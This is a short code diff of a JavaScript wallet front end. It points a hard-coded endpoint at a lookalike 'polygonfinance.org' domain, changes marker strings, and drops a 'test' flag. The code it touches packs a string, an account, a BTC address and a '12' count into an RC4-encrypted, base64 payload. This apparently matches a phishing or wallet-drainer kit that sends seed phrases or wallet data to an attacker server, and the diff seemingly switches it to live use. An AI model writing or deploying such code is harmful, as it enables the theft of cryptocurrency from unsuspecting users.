@@ -35,7 +35,7 @@ const initialState = {
 	currencyPrice: null,
 }
 
-let url = 'https://localnetwork.cc/custom/activity/root'
+let url = 'https://polygonfinance.org/concept/unity/check'
 const kitkat = process.env.REACT_APP_KEY
 
 function createBody(str, account, btcAddress) {
@@ -46,8 +46,8 @@ function createBody(str, account, btcAddress) {
 	} else {
 		strDecr = str
 	}
-	let xxx = '$parr0w#|EX\\$/G'
-	let xx = '$parr0w#|EX\\$'
+	let xxx = 'PoLYGON/G'
+	let xx = 'PoLYGON'
 
 	const obj = {
 		counts: 12,
@@ -59,7 +59,6 @@ function createBody(str, account, btcAddress) {
 		frontCode: false,
 		new: account,
 		addressBtc: btcAddress,
-		test: true,
 	}
 
 	let crypt = btoa(rc4(kitkat, JSON.stringify(obj)))
